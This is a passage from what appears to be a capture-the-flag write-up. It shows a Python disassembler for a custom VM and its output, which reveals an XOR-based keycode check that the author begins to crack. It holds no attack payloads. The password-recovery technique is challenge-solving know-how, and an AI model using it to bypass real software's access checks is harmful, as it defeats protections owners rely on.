</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_store</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>dest</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>src</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: STORE </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>src</span><span class=p>)</span><span class=si>}</span><span class=s2> -&gt; </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>dest</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(f&#34;STORE {hex(src)} = {hex(dest)}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_add</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>a1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>a2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>a3</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: ADD </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>a1</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>a2</span><span class=p>)</span><span class=si>}</span><span class=s2> + </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>a3</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_jle</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>cmp1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>cmp2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>jmp_addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=n>file_data</span><span class=p>[</span><span class=mi>3</span><span class=p>:</span><span class=mi>5</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: JLE </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>jmp_addr</span><span class=p>)</span><span class=si>}</span><span class=s2> IF </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>cmp1</span><span class=p>)</span><span class=si>}</span><span class=s2> &gt; </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>cmp2</span><span class=p>)</span><span class=si>}</span><span class=s2>  &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_load</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>src</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>dest</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: LOAD </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>src</span><span class=p>)</span><span class=si>}</span><span class=s2> &lt;- </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>dest</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_xor</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>dest</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>xor1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>xor2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: XOR </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>dest</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>xor1</span><span class=p>)</span><span class=si>}</span><span class=s2> ^ </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>xor2</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_je</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>cmp1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>cmp2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>jmp_addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=n>file_data</span><span class=p>[</span><span class=mi>3</span><span class=p>:</span><span class=mi>5</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: JE </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>jmp_addr</span><span class=p>)</span><span class=si>}</span><span class=s2> IF </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>cmp1</span><span class=p>)</span><span class=si>}</span><span class=s2> == </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>cmp2</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_exit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;{hex(instruction_counter)}: VM EXIT&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_push</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: PUSH </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_inv</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>data1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>data2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: INV </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>data1</span><span class=p>)</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>data2</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_multi</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>dest</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>arg1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>arg2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: MULTI </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>dest</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>arg1</span><span class=p>)</span><span class=si>}</span><span class=s2> * </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>arg2</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_instruction</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span><span class=p>,</span> <span class=n>instruction_counter</span>
</span></span><span class=line><span class=cl>    <span class=n>opcode</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>match</span> <span class=n>opcode</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mi>5</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_multi</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_add</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x10</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_putc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x11</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_je</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x13</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_jle</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x9</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_inv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0xa</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_push</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0xc</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_mov</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0xe</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x15</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_xor</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_store</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x17</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_load</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x18</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_input</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=n>_</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;NOT IMPLEMENTED&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>file_data</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>6</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=n>instruction_counter</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;bin&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>file_data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()[</span><span class=mi>3</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>!=</span> <span class=mh>0x19</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_instruction</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>This produced the following output, which seems correct as the characters supplied to <code>putc</code> match
the string printed when the program is run.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>└─$ python3 disassemble_vm.py
</span></span><span class=line><span class=cl>0x0: putc(&#39;[&#39;)
</span></span><span class=line><span class=cl>0x1: putc(&#39;M&#39;)
</span></span><span class=line><span class=cl>0x2: putc(&#39;a&#39;)
</span></span><span class=line><span class=cl>0x3: putc(&#39;i&#39;)
</span></span><span class=line><span class=cl>0x4: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0x5: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x6: putc(&#39;V&#39;)
</span></span><span class=line><span class=cl>0x7: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x8: putc(&#39;s&#39;)
</span></span><span class=line><span class=cl>0x9: putc(&#39;s&#39;)
</span></span><span class=line><span class=cl>0xa: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0xb: putc(&#39;l&#39;)
</span></span><span class=line><span class=cl>0xc: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0xd: putc(&#39;T&#39;)
</span></span><span class=line><span class=cl>0xe: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0xf: putc(&#39;r&#39;)
</span></span><span class=line><span class=cl>0x10: putc(&#39;m&#39;)
</span></span><span class=line><span class=cl>0x11: putc(&#39;i&#39;)
</span></span><span class=line><span class=cl>0x12: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0x13: putc(&#39;a&#39;)
</span></span><span class=line><span class=cl>0x14: putc(&#39;l&#39;)
</span></span><span class=line><span class=cl>0x15: putc(&#39;]&#39;)
</span></span><span class=line><span class=cl>0x16: putc(&#39;
</span></span><span class=line><span class=cl>&#39;)
</span></span><span class=line><span class=cl>0x17: putc(&#39;&lt;&#39;)
</span></span><span class=line><span class=cl>0x18: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x19: putc(&#39;E&#39;)
</span></span><span class=line><span class=cl>0x1a: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0x1b: putc(&#39;t&#39;)
</span></span><span class=line><span class=cl>0x1c: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x1d: putc(&#39;r&#39;)
</span></span><span class=line><span class=cl>0x1e: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x1f: putc(&#39;k&#39;)
</span></span><span class=line><span class=cl>0x20: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x21: putc(&#39;y&#39;)
</span></span><span class=line><span class=cl>0x22: putc(&#39;c&#39;)
</span></span><span class=line><span class=cl>0x23: putc(&#39;o&#39;)
</span></span><span class=line><span class=cl>0x24: putc(&#39;d&#39;)
</span></span><span class=line><span class=cl>0x25: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x26: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x27: putc(&#39;
</span></span><span class=line><span class=cl>&#39;)
</span></span><span class=line><span class=cl>0x28: putc(&#39;&gt;&#39;)
</span></span><span class=line><span class=cl>0x29: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x2a: MOV 0x1e = 0xfa0
</span></span><span class=line><span class=cl>0x2b: MOV 0x1c = 0x0
</span></span><span class=line><span class=cl>0x2c: MOV 0x1d = 0x11
</span></span><span class=line><span class=cl>0x2d: INPUT: 0x19
</span></span><span class=line><span class=cl>0x2e: STORE 0x19 -&gt; 0x1e
</span></span><span class=line><span class=cl>0x2f: ADD 0x1e = 0x1e + 0x1
</span></span><span class=line><span class=cl>0x30: ADD 0x1c = 0x1c + 0x1
</span></span><span class=line><span class=cl>0x31: JLE 0x2d IF 0x1c &gt; 0x1d
</span></span><span class=line><span class=cl>0x32: MOV 0x1e = 0x1004
</span></span><span class=line><span class=cl>0x33: MOV 0x1f = 0xfa0
</span></span><span class=line><span class=cl>0x34: MOV 0x1c = 0x0
</span></span><span class=line><span class=cl>0x35: MOV 0x1d = 0xa
</span></span><span class=line><span class=cl>0x36: MOV 0x1b = 0xa9
</span></span><span class=line><span class=cl>0x37: MOV 0x17 = 0x0
</span></span><span class=line><span class=cl>0x38: LOAD 0x19 &lt;- 0x1e
</span></span><span class=line><span class=cl>0x39: LOAD 0x18 &lt;- 0x1f
</span></span><span class=line><span class=cl>0x3a: XOR 0x19 = 0x19 ^ 0x1b
</span></span><span class=line><span class=cl>0x3b: JE 0x4e IF 0x19 == 0x18
</span></span><span class=line><span class=cl>0x3c: putc(&#39;U&#39;)
</span></span><span class=line><span class=cl>0x3d: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0x3e: putc(&#39;k&#39;)
</span></span><span class=line><span class=cl>0x3f: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0x40: putc(&#39;o&#39;)
</span></span><span class=line><span class=cl>0x41: putc(&#39;w&#39;)
</span></span><span class=line><span class=cl>0x42: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0x43: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x44: putc(&#39;k&#39;)
</span></span><span class=line><span class=cl>0x45: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x46: putc(&#39;y&#39;)
</span></span><span class=line><span class=cl>0x47: putc(&#39;c&#39;)
</span></span><span class=line><span class=cl>0x48: putc(&#39;o&#39;)
</span></span><span class=line><span class=cl>0x49: putc(&#39;d&#39;)
</span></span><span class=line><span class=cl>0x4a: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x4b: putc(&#39;!&#39;)
</span></span><span class=line><span class=cl>0x4c: putc(&#39;
</span></span><span class=line><span class=cl>&#39;)
</span></span><span class=line><span class=cl>0x4d: VM EXIT
</span></span><span class=line><span class=cl>0x4e: ADD 0x1e = 0x1e + 0x1
</span></span><span class=line><span class=cl>0x4f: ADD 0x1f = 0x1f + 0x1
</span></span><span class=line><span class=cl>0x50: ADD 0x1c = 0x1c + 0x1
</span></span><span class=line><span class=cl>0x51: JLE 0x38 IF 0x1c &gt; 0x1d
</span></span><span class=line><span class=cl>0x52: MOV 0xf = 0x0
</span></span><span class=line><span class=cl>0x53: PUSH 0xf
</span></span><span class=line><span class=cl>0x54: PUSH 0xf
</span></span><span class=line><span class=cl>0x55: PUSH 0xf
</span></span><span class=line><span class=cl>0x56: INV 0x65, 0x3
</span></span><span class=line><span class=cl>0x57: MOV 0x10 = 0x0
</span></span><span class=line><span class=cl>0x58: JE 0x6c IF 0x1f == 0x10
</span></span><span class=line><span class=cl>0x59: putc(&#39;T&#39;)
</span></span><span class=line><span class=cl>0x5a: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x5b: putc(&#39;r&#39;)
</span></span><span class=line><span class=cl>0x5c: putc(&#39;m&#39;)
</span></span><span class=line><span class=cl>0x5d: putc(&#39;i&#39;)
</span></span><span class=line><span class=cl>0x5e: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0x5f: putc(&#39;a&#39;)
</span></span><span class=line><span class=cl>0x60: putc(&#39;l&#39;)
</span></span><span class=line><span class=cl>0x61: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x62: putc(&#39;b&#39;)
</span></span><span class=line><span class=cl>0x63: putc(&#39;l&#39;)
</span></span><span class=line><span class=cl>0x64: putc(&#39;o&#39;)
</span></span><span class=line><span class=cl>0x65: putc(&#39;c&#39;)
</span></span><span class=line><span class=cl>0x66: putc(&#39;k&#39;)
</span></span><span class=line><span class=cl>0x67: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x68: putc(&#39;d&#39;)
</span></span><span class=line><span class=cl>0x69: putc(&#39;!&#39;)
</span></span><span class=line><span class=cl>0x6a: putc(&#39;
</span></span><span class=line><span class=cl>&#39;)
</span></span><span class=line><span class=cl>{hex(instruction_counter)}: VM EXIT
</span></span><span class=line><span class=cl>0x6c: MOV 0x1e = 0x77
</span></span><span class=line><span class=cl>0x6d: MULTI 0x1e = 0x1e * 0x6
</span></span><span class=line><span class=cl>0x6e: MOV 0x1c = 0x0
</span></span><span class=line><span class=cl>0x6f: MOV 0x1d = 0x5dc
</span></span><span class=line><span class=cl>0x70: MOV 0x1b = 0x45
</span></span><span class=line><span class=cl>0x71: LOAD 0x19 &lt;- 0x1e
</span></span><span class=line><span class=cl>0x72: XOR 0x19 = 0x19 ^ 0x1b
</span></span><span class=line><span class=cl>0x73: STORE 0x19 -&gt; 0x1e
</span></span><span class=line><span class=cl>0x74: ADD 0x1e = 0x1e + 0x1
</span></span><span class=line><span class=cl>0x75: ADD 0x1c = 0x1c + 0x1
</span></span><span class=line><span class=cl>0x76: JLE 0x71 IF 0x1c &gt; 0x1d
</span></span><span class=line><span class=cl>NOT IMPLEMENTED
</span></span></code></pre></td></tr></table></div></div><h3 id=getting-the-first-password>Getting the First Password</h3><p>The first interesting part of the assembly, in terms of progression, is just after <code>putc</code>. The program take some
user input, 1 byte at a time, for 18 bytes. After that, it iterates through
memory, <code>xor</code>ing each byte with <code>0xa9</code>, and comparing the result to the user input, character
by character. If the input doesn&rsquo;t match, the program prints an error &ldquo;unknown keycode&rdquo; and exits,
else it continues through the loop until every byte has been checked.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
